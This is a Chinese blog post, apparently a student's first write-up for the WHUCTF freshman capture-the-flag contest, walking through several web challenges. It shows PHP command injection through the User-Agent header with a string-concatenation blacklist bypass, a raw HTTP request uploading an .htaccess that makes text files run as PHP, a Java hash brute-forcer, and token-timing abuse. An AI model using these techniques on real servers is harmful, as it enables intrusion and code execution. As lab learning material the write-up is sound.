@@ -1,0 +1,745 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="">
+  <meta name="author" content="Blank">
+  <meta name="keywords" content="Blank">
+  
+    <meta name="description" content="打完新生赛，贴一下第一次写的wp什么的 web[0-Div3]User0Agent先看看题目和提示   可以得知本题应该要考察使用抓包工具修改User-Agent为php语言的linux指令   url后面添加参数可以查看源码：   看不懂源码就扔给ai分析一下可以得知：    字符黑名单：”pattern_blacklist” &#x3D;&gt; [‘primary’ &#x3D;&gt; ‘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WHUCTF新生赛WP，总结与废话">
+<meta property="og:url" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/index.html">
+<meta property="og:site_name" content="Blank">
+<meta property="og:description" content="打完新生赛，贴一下第一次写的wp什么的 web[0-Div3]User0Agent先看看题目和提示   可以得知本题应该要考察使用抓包工具修改User-Agent为php语言的linux指令   url后面添加参数可以查看源码：   看不懂源码就扔给ai分析一下可以得知：    字符黑名单：”pattern_blacklist” &#x3D;&gt; [‘primary’ &#x3D;&gt; ‘">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-120547.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-114817.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-115104.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-115832.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-120022.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-182941.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-094832.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-183647.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-182401.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-203706.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-204519.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-211226.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-212840.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-095842.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-221150.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-100956.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-134305.png">
+<meta property="og:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-225714.png">
+<meta property="article:published_time" content="2025-10-28T11:14:48.000Z">
+<meta property="article:modified_time" content="2025-10-28T12:03:05.727Z">
+<meta property="article:author" content="Blank">
+<meta property="article:tag" content="CTF WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-120547.png">
+  
+  
+  
+  <title>WHUCTF新生赛WP，总结与废话 - Blank</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-categories-fill"></i>
+                <span>categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-friends-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WHUCTF新生赛WP，总结与废话"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-28 19:14" pubdate>
+          2025年10月28日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WHUCTF新生赛WP，总结与废话</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>打完新生赛，贴一下第一次写的wp什么的</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0-Div3-User0Agent"><a href="#0-Div3-User0Agent" class="headerlink" title="[0-Div3]User0Agent"></a>[0-Div3]User0Agent</h3><p>先看看题目和提示</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-120547.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>可以得知本题应该要考察使用抓包工具修改User-Agent为php语言的linux指令</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-114817.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>url后面添加参数可以查看源码：</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-115104.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>看不懂源码就扔给ai分析一下可以得知：</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>字符黑名单：”pattern_blacklist” &#x3D;&gt; [‘primary’ &#x3D;&gt; ‘&#x2F;cat|flag|env&#x2F;‘,’secondary’ &#x3D;&gt; [‘..&#x2F;..&#x2F;‘,’&#x2F;etc&#x2F;‘,’&#x2F;&#x2F;passwd&#x2F;‘]]<br>白名单：”allowed_chars” &#x3D;&gt; ‘&#x2F;^[a-zA-Z0-9_-$&#x3D;&lt;&gt;.”%s&#39;t+*\<a href="">\</a>\&#x2F;]+$&#x2F;‘</p>
+</blockquote>
+</blockquote>
+</blockquote>
+<p>接下来先看看目录<br>User-Agent: system(‘ls &#x2F;‘);</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-115832.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>接着抓取flag，因为cat和flag在黑名单里所以使用转义拼接<br>User-Agent: system(“t”.”ac &#x2F;fla”.”g”);<br>于是得到flag</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251024-120022.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="1-Div3-井字棋小游戏"><a href="#1-Div3-井字棋小游戏" class="headerlink" title="[1-Div3]井字棋小游戏]"></a>[1-Div3]井字棋小游戏]</h3><p>题目提示说F12没什么用但是交互小游戏不开F12怎么看js代码，于是看到一串超级长混淆过的js代码（忘记截图了）。<br>看不懂没关系可以扔给AI，然后AI帮我们分析得到</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-182941.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>于是抓包修改为目标所需的POST请求</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-094832.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>GET!!!</p>
+<h3 id="1-Div1-5-apacherrr"><a href="#1-Div1-5-apacherrr" class="headerlink" title="[1-Div1.5]apacherrr"></a>[1-Div1.5]apacherrr</h3><p>这个题目我只能说对新手没那么友好，Blank重开了很多次容器然后有些细节询问了Kuri才做出来了，<strong>并且有一些奇怪的点很容易卡住！！！</strong><br>题目描述了三个apache的配置，然后同样是看不懂就扔给AI分析吧</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-183647.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>AI还是比较聪明的然后我们就可以得到一个大概思路了：通过上传.htaccess文件使得其他形式的上传文件可以执行php</p>
+<p>下午补了提示说可以用.txt那我们就用.txt（然而谁能想到我各种形式都试过了呢）<br>然后可以用bp请求一下uploaderrr.com发现响应出一个upload.php，这个就是可以上传的点了。</p>
+<p>然后上传一个.htaccess一个shell.txt可以交给AI那我们就交给AI写算了</p>
+<p><strong>这里要注意的是不要上传到根目录</strong>虽然AI分析完会说第三个配置里不限制.htaccess会推荐传到根目录但是实际上传到当前目录就行了</p>
+<p>这是因为uploaderrr.com和whuctf2025.com的目录都在html下面，而既然最终根目录不限制其实就是整个目录都不限制了（）并且上传也是存储在uploads下面hhh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /upload.php HTTP/1.1<br>Host: uploaderrr.com<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW<br>Content-Length: 320<br>Connection: close<br><br>------WebKitFormBoundary7MA4YWxkTrZu0gW<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;userfile&quot;</span>; filename=<span class="hljs-string">&quot;.htaccess&quot;</span><br>Content-Type: text/plain<br><br><span class="hljs-comment"># 启用重写引擎</span><br>RewriteEngine On<br><br><span class="hljs-comment"># 将所有.txt文件当作PHP执行</span><br>&lt;FilesMatch <span class="hljs-string">&quot;\.(txt|log|md|text)$&quot;</span>&gt;<br>    SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br><br><span class="hljs-comment"># 强制PHP处理txt文件</span><br>AddType application/x-httpd-php .txt .<span class="hljs-built_in">log</span> .md<br><br><span class="hljs-comment"># 禁用PHP安全模式（如果可能）</span><br>php_flag safe_mode off<br><br><span class="hljs-comment"># 允许执行系统命令</span><br>php_flag exec_dir none<br><br><span class="hljs-comment"># 设置最大执行时间</span><br>php_value max_execution_time 300<br>------WebKitFormBoundary7MA4YWxkTrZu0gW--<br></code></pre></td></tr></table></figure>
+
+<p>因为我是气急败坏跑了一个功能完整的上传了，所以实际上可能不需要这么长。<br>然后shell.txt的话我现在还不太会写一句话木马，所以也是在提示下写了这个弹出环境变量的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /upload.php HTTP/1.1<br>Host: uploaderrr.com<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW<br>Content-Length: 380<br>Connection: close<br><br>------WebKitFormBoundary7MA4YWxkTrZu0gW<br>Content-Disposition: form-data; name=<span class="hljs-string">&quot;userfile&quot;</span>; filename=<span class="hljs-string">&quot;config.txt&quot;</span><br>Content-Type: text/plain<br>&lt;?php phpinfo(); ?&gt;<br>------WebKitFormBoundary7MA4YWxkTrZu0gW--<br></code></pre></td></tr></table></figure>
+
+<p>好的然后我们进行一个访问文件，<strong>非常要注意的是不要访问uploaderrr.com！！！</strong><br>否则你就会跟Blank一样抓狂半天怀疑是不是传错了然后回去重传根目录(什么竟然连起来了)</p>
+<p>我们可以回顾一下AI分析的配置，可以发现whuctf2025.com下面是有一个名为uploads的文件夹的。</p>
+<p>这个地方也是稍微要分析一下，逻辑捋顺了不会兜圈子很久</p>
+<p>于是用bp请求这个会弹出环境变量，然后搜索flag往下找找可以找到</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251025-182401.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="3-Div2-Guild"><a href="#3-Div2-Guild" class="headerlink" title="[3-Div2]Guild"></a>[3-Div2]Guild</h3><p>kuri师傅紧急上新题目，下载题目中的server.jar和群里上传的jadx-gui，查看jadx-gui的反编译出来的源码</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-203706.png" srcset="/img/loading.gif" lazyload class="">
+<p>反编译的代码看不懂扔给AI可以得知这个题目的用户名固定为admin</p>
+<p>密码经过哈希加密但在&#x2F;secret_r0uter中泄露了</p>
+<p>访问这个路径可以看见加密后的数字</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-204519.png" srcset="/img/loading.gif" lazyload class="">
+<p>简单让AI跑个java代码然后解密出原密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">import java.util.UUID;<br>public class PasswordCracker &#123;<br>    public static void main(String[] args) &#123;<br>        int targetHash = 38222;<br>        long attempts = 0;<br>        long startTime = System.currentTimeMillis();<br>        <br>        System.out.println(<span class="hljs-string">&quot;开始破解哈希值: &quot;</span> + targetHash);<br>        System.out.println(<span class="hljs-string">&quot;目标：找到 hashCode() % 65536 = &quot;</span> + targetHash + <span class="hljs-string">&quot; 的UUID&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;破解中... (按 Ctrl+C 停止)&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;----------------------------------------&quot;</span>);<br>        <br>        try &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>                // 生成随机UUID<br>                String uuid = UUID.randomUUID().toString();<br>                // 计算哈希值<br>                int <span class="hljs-built_in">hash</span> = uuid.hashCode() % 65536;<br>                attempts++;<br>                <br>                // 检查是否匹配<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hash</span> == targetHash) &#123;<br>                    long elapsedTime = System.currentTimeMillis() - startTime;<br>                    System.out.println(<span class="hljs-string">&quot;\n========================================&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;🎉 破解成功!&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;原始密码: &quot;</span> + uuid);<br>                    System.out.println(<span class="hljs-string">&quot;计算哈希: &quot;</span> + <span class="hljs-built_in">hash</span>);<br>                    System.out.println(<span class="hljs-string">&quot;尝试次数: &quot;</span> + attempts);<br>                    System.out.println(<span class="hljs-string">&quot;耗时: &quot;</span> + elapsedTime + <span class="hljs-string">&quot;ms (&quot;</span> + (elapsedTime/1000.0) + <span class="hljs-string">&quot;秒)&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;平均速度: &quot;</span> + (attempts/(elapsedTime/1000.0)) + <span class="hljs-string">&quot; 次/秒&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;========================================&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;\n使用以下凭证登录系统:&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;用户名: admin&quot;</span>);<br>                    System.out.println(<span class="hljs-string">&quot;密码: &quot;</span> + uuid);<br>                    <span class="hljs-built_in">break</span>;<br>                &#125;<br>                <br>                // 每10万次显示进度<br>                <span class="hljs-keyword">if</span> (attempts % 100000 == 0) &#123;<br>                    long currentTime = System.currentTimeMillis();<br>                    long elapsed = currentTime - startTime;<br>                    double rate = attempts / (elapsed / 1000.0);<br>                    System.out.println(<span class="hljs-string">&quot;已尝试 &quot;</span> + attempts + <span class="hljs-string">&quot; 次, 速度: &quot;</span> + String.format(<span class="hljs-string">&quot;%.0f&quot;</span>, rate) + <span class="hljs-string">&quot; 次/秒&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;程序被中断，已尝试 &quot;</span> + attempts + <span class="hljs-string">&quot; 次&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>登录以后F12查看源码即可<br><strong>要注意的是要用java代码进行哈希破解不用python进行哈希</strong></p>
+<p>Blank在提示下用python跑哈希解码失败了，我只能说竟然还有误导真是太坏了。</p>
+<h3 id="1-Div1-ZakoLogin"><a href="#1-Div1-ZakoLogin" class="headerlink" title="[1-Div1]ZakoLogin"></a>[1-Div1]ZakoLogin</h3><p>生死时速局，多谢kuri大人手速援助（）看看题目</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-211226.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>看出来这个token的提示已经非常多了就差把wp贴上来了，看起来很怕爆零了，我初步推测是token变化是有规律的可以预测然后趁着下次token变化之前提前发包。</p>
+<p>至于怎么看token的变化规律就先发一百次包吧hhh（）于是半小时内速下yakit然后发包提取一百次token</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-212840.png" srcset="/img/loading.gif" lazyload class="">
+<p>提取完token然后重开一个容器yakit拦截对照提取出来的表，在下一次token更新前进行拦截</p>
+<p>手速局孩子们。然后<strong>复现的时候发现并不能完全靠手速</strong>这个地方要先算准10s的刷新时机然后再发包才行，重复100次发包可以增加概率。</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251027-095842.png" srcset="/img/loading.gif" lazyload class="">
+<p>成功以后查看响应可以看见我们要找的token，但是有了token还不够，所以我们需要找到正确的url请求flag，想想登录成功会发生什么于是看看js代码</p>
+<p>js代码应该在app里面，找到登录成功字段后面的path</p>
+<img src="/2025/10/28/WHUCTF%E6%96%B0%E7%94%9F%E8%B5%9BWP%EF%BC%8C%E6%80%BB%E7%BB%93%E4%B8%8E%E5%BA%9F%E8%AF%9D/QQ20251026-221150.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>发送目标url的请求带上找到的token值就可以找到了。（哎其实我不是大哥哥这是可以说的吗）</p>
